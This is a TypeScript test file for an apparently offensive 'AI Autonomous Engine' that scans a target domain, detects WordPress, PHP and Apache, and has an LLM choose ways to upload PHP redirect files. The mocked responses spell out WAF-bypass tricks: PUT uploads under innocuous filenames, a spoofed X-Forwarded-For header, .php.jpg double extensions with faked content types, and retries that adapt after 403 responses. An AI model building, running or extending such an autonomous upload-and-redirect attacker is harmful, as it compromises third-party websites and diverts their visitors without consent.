import { describe, it, expect, vi, beforeEach } from "vitest";
import type { AiCommanderConfig, AiCommanderResult, AiCommanderEvent, ReconData, AiDecision, ExecutionResult } from "./ai-autonomous-engine";

// Mock fetch globally
const mockFetch = vi.fn();
global.fetch = mockFetch as any;

// Mock LLM
vi.mock("./_core/llm", () => ({
  invokeLLM: vi.fn().mockImplementation(async ({ messages }: any) => {
    const lastMsg = messages[messages.length - 1]?.content || "";

    // Decision-making LLM call
    if (lastMsg.includes("DECIDE") || lastMsg.includes("method") || lastMsg.includes("attack")) {
      return {
        choices: [{
          message: {
            content: JSON.stringify({
              method: "direct_upload_put",
              payload: '<?php header("Location: https://example.com"); exit; ?>',
              filename: "wp-cache-test123.php",
              uploadPath: "/wp-content/uploads/",
              contentType: "application/x-php",
              httpMethod: "PUT",
              headers: { "X-Forwarded-For": "127.0.0.1" },
              reasoning: "Target is Apache with PHP, PUT method may bypass WAF",
              bypassTechnique: "PUT method + innocuous filename",
              confidence: 65,
              isRedirectPayload: true,
            }),
          },
        }],
      };
    }

    // Learning/adaptation LLM call
    return {
      choices: [{
        message: {
          content: JSON.stringify({
            analysis: "Upload returned 403 Forbidden — WAF is blocking PHP files",
            nextStrategy: "Try double extension bypass with .php.jpg",
            shouldContinue: true,
            adjustments: {
              newMethod: "multipart_form_upload",
              newFilename: "image-cache.php.jpg",
              newContentType: "image/jpeg",
            },
          }),
        },
      }],
    };
  }),
}));

// Mock DNS lookup
vi.mock("dns", () => ({
  promises: {
    resolve4: vi.fn().mockResolvedValue(["93.184.216.34"]),
  },
}));

describe("AI Autonomous Engine", () => {
  beforeEach(() => {
    vi.clearAllMocks();

    // Default mock: server returns 403 for uploads
    mockFetch.mockImplementation(async (url: string, opts: any) => {
      const urlStr = typeof url === "string" ? url : url.toString();

      // Recon: main page
      if (!opts || opts.method === "GET" || opts.method === "HEAD") {
        return {
          ok: true,
          status: 200,
          headers: new Map([
            ["server", "Apache/2.4.41"],
            ["x-powered-by", "PHP/7.4"],
          ]),
          text: async () => '<html><head><meta name="generator" content="WordPress 6.4" /></head><body></body></html>',
        };
      }

      // Upload attempts: 403 by default
      return {
        ok: false,
        status: 403,
        headers: new Map(),
        text: async () => "Forbidden",
      };
    });
  });

  it("should export runAiCommander function", async () => {
    const mod = await import("./ai-autonomous-engine");
    expect(mod.runAiCommander).toBeDefined();
    expect(typeof mod.runAiCommander).toBe("function");
  });

  it("should export correct types", async () => {
    // Type-level check — if this compiles, types are correct
    const config: AiCommanderConfig = {
      targetDomain: "example.com",
      redirectUrl: "https://redirect.com",
      maxIterations: 5,
      timeoutPerAttempt: 10000,
      seoKeywords: ["test"],
    };
    expect(config.targetDomain).toBe("example.com");
    expect(config.maxIterations).toBe(5);
  });

  it("should have correct AiDecision interface", () => {
    const decision: AiDecision = {
      iteration: 1,
      method: "direct_upload_put",
      payload: '<?php header("Location: https://example.com"); ?>',
      filename: "test.php",
      uploadPath: "/uploads/",
      contentType: "application/x-php",
      httpMethod: "PUT",
      headers: {},
      reasoning: "Test",
      bypassTechnique: "none",
      confidence: 50,
      isRedirectPayload: true,
    };
    expect(decision.method).toBe("direct_upload_put");
    expect(decision.httpMethod).toBe("PUT");
    expect(decision.isRedirectPayload).toBe(true);
  });

  it("should have correct AiCommanderResult interface", () => {
    const result: AiCommanderResult = {
      success: false,
      iterations: 3,
      successfulMethod: null,
      uploadedUrl: null,
      redirectVerified: false,
      decisions: [],
      executionResults: [],
      reconData: null,
      totalDurationMs: 5000,
    };
    expect(result.success).toBe(false);
    expect(result.iterations).toBe(3);
    expect(result.totalDurationMs).toBe(5000);
  });

  it("should have correct AiCommanderEvent types", () => {
    const events: AiCommanderEvent[] = [
      { type: "recon", iteration: 0, maxIterations: 10, detail: "Scanning target..." },
      { type: "decision", iteration: 1, maxIterations: 10, detail: "AI chose PUT method" },
      { type: "execute", iteration: 1, maxIterations: 10, detail: "Uploading..." },
      { type: "learn", iteration: 1, maxIterations: 10, detail: "Analyzing result..." },
      { type: "adapt", iteration: 1, maxIterations: 10, detail: "Adjusting strategy..." },
      { type: "success", iteration: 2, maxIterations: 10, detail: "Upload successful!" },
      { type: "exhausted", iteration: 10, maxIterations: 10, detail: "All iterations used" },
      { type: "error", iteration: 1, maxIterations: 10, detail: "Network error" },
    ];
    expect(events).toHaveLength(8);
    expect(events.map(e => e.type)).toEqual([
      "recon", "decision", "execute", "learn", "adapt", "success", "exhausted", "error",
    ]);
  });

  it("should run recon phase and collect data", async () => {
    const { runAiCommander } = await import("./ai-autonomous-engine");
    const events: AiCommanderEvent[] = [];

    // Run with 1 iteration to test recon + 1 attempt
    const result = await runAiCommander({
      targetDomain: "example.com",
      redirectUrl: "https://redirect.com",
      maxIterations: 1,
      timeoutPerAttempt: 5000,
      onEvent: (event) => events.push(event),
    });

    // Should have recon event
    const reconEvents = events.filter(e => e.type === "recon");
    expect(reconEvents.length).toBeGreaterThanOrEqual(1);

    // Result should have reconData
    expect(result.reconData).toBeDefined();
    expect(result.iterations).toBeGreaterThanOrEqual(1);
    expect(result.totalDurationMs).toBeGreaterThan(0);
  });

  it("should emit decision events when LLM decides", async () => {
    const { runAiCommander } = await import("./ai-autonomous-engine");
    const events: AiCommanderEvent[] = [];

    const result = await runAiCommander({
      targetDomain: "example.com",
      redirectUrl: "https://redirect.com",
      maxIterations: 2,
      timeoutPerAttempt: 5000,
      onEvent: (event) => events.push(event),
    });

    // Should have decision events
    const decisionEvents = events.filter(e => e.type === "decision");
    expect(decisionEvents.length).toBeGreaterThanOrEqual(1);

    // Should have execute events
    const executeEvents = events.filter(e => e.type === "execute");
    expect(executeEvents.length).toBeGreaterThanOrEqual(1);

    // Result should have decisions
    expect(result.decisions.length).toBeGreaterThanOrEqual(1);
    expect(result.executionResults.length).toBeGreaterThanOrEqual(1);
  });

  it("should handle success when upload works", async () => {
    // Override fetch to return 200 for upload + verification
    mockFetch.mockImplementation(async (url: string, opts: any) => {
      const urlStr = typeof url === "string" ? url : url.toString();

      // Upload: return 200 (success)
      if (opts?.method === "PUT" || opts?.method === "POST") {
        return {
          ok: true,
          status: 200,
          headers: new Map(),
          text: async () => "OK",
        };
      }

      // Verification GET: return redirect
      if (urlStr.includes(".php") && (!opts || opts.method === "GET" || opts.method === "HEAD")) {
        return {
          ok: true,
          status: 200,
          redirected: true,
          url: "https://redirect.com",
          headers: new Map([["location", "https://redirect.com"]]),
          text: async () => '<html><script>window.location="https://redirect.com"</script></html>',
        };
      }

      // Default: main page
      return {
        ok: true,
        status: 200,
        headers: new Map([
          ["server", "Apache/2.4.41"],
          ["x-powered-by", "PHP/7.4"],
        ]),
        text: async () => '<html><head><meta name="generator" content="WordPress 6.4" /></head><body></body></html>',
      };
    });

    const { runAiCommander } = await import("./ai-autonomous-engine");
    const events: AiCommanderEvent[] = [];

    const result = await runAiCommander({
      targetDomain: "example.com",
      redirectUrl: "https://redirect.com",
      maxIterations: 3,
      timeoutPerAttempt: 5000,
      onEvent: (event) => events.push(event),
    });

    // Should detect success
    if (result.success) {
      expect(result.uploadedUrl).toBeTruthy();
      expect(result.successfulMethod).toBeTruthy();
      const successEvents = events.filter(e => e.type === "success");
      expect(successEvents.length).toBeGreaterThanOrEqual(1);
    }
    // Even if not success (depends on verification), should have attempted
    expect(result.iterations).toBeGreaterThanOrEqual(1);
  });

  it("should respect maxIterations limit", async () => {
    const { runAiCommander } = await import("./ai-autonomous-engine");
    const maxIter = 2;

    const result = await runAiCommander({
      targetDomain: "example.com",
      redirectUrl: "https://redirect.com",
      maxIterations: maxIter,
      timeoutPerAttempt: 5000,
    });

    expect(result.iterations).toBeLessThanOrEqual(maxIter);
  });

  it("should return exhausted when all iterations fail", async () => {
    const { runAiCommander } = await import("./ai-autonomous-engine");
    const events: AiCommanderEvent[] = [];

    const result = await runAiCommander({
      targetDomain: "example.com",
      redirectUrl: "https://redirect.com",
      maxIterations: 2,
      timeoutPerAttempt: 5000,
      onEvent: (event) => events.push(event),
    });

    if (!result.success) {
      // Should have exhausted event
      const exhaustedEvents = events.filter(e => e.type === "exhausted");
      expect(exhaustedEvents.length).toBeGreaterThanOrEqual(1);
      expect(result.uploadedUrl).toBeNull();
      expect(result.successfulMethod).toBeNull();
    }
  });
});
